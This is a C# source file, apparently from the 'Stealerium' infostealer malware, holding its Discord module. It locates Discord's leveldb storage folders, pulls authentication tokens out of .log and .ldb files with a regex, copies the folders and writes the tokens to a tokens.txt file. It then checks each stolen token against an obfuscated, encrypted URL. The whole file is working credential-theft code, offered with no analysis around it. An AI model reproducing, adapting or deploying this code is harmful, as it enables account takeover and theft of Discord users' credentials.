using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;

namespace Stealerium.Target.Messengers;

internal sealed class Discord
{
	private static readonly Regex TokenRegex = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

	private static readonly string[] DiscordDirectories = new string[3] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };

	public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
	{
		if (lcDicordTokens.Length != 0)
		{
			Directory.CreateDirectory(sSavePath);
			Counter.Discord = true;
			try
			{
				foreach (string text in lcDicordTokens)
				{
					File.AppendAllText(sSavePath + "\\tokens.txt", text + "\n");
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
		try
		{
			CopyLevelDb(sSavePath);
		}
		catch
		{
		}
	}

	private static void CopyLevelDb(string sSavePath)
	{
		string[] discordDirectories = DiscordDirectories;
		foreach (string path in discordDirectories)
		{
			string directoryName = Path.GetDirectoryName(Path.Combine(Paths.Appdata, path));
			if (directoryName == null)
			{
				continue;
			}
			string destFolder = Path.Combine(sSavePath, new DirectoryInfo(directoryName).Name);
			if (Directory.Exists(directoryName))
			{
				try
				{
					Filemanager.CopyDirectory(directoryName, destFolder);
				}
				catch
				{
				}
			}
		}
	}

	private static string TokenState(string token)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Headers.Add("Authorization", token);
			return webClient.DownloadString(StringsCrypt.Decrypt(new byte[48]
			{
				241, 158, 131, 195, 114, 143, 24, 236, 11, 26,
				170, 234, 134, 223, 42, 61, 187, 96, 145, 91,
				90, 194, 45, 241, 225, 114, 244, 246, 148, 239,
				168, 39, 54, 186, 251, 17, 156, 78, 204, 216,
				18, 220, 138, 249, 160, 239, 29, 0
			})).Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
		}
		catch
		{
		}
		return "Connection error";
	}

	public static string[] GetTokens()
	{
		List<string> list = new List<string>();
		try
		{
			string[] discordDirectories = DiscordDirectories;
			foreach (string path in discordDirectories)
			{
				string text2 = Path.Combine(Paths.Appdata, path);
				string text3 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text2).Name);
				if (Directory.Exists(text2))
				{
					Filemanager.CopyDirectory(text2, text3);
					list.AddRange(from file in Directory.GetFiles(text3)
						where file.EndsWith(".log") || file.EndsWith(".ldb")
						select File.ReadAllText(file) into text
						select TokenRegex.Match(text) into match
						where match.Success
						select match.Value + " - " + TokenState(match.Value));
					Filemanager.RecursiveDelete(text3);
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return list.ToArray();
	}
}
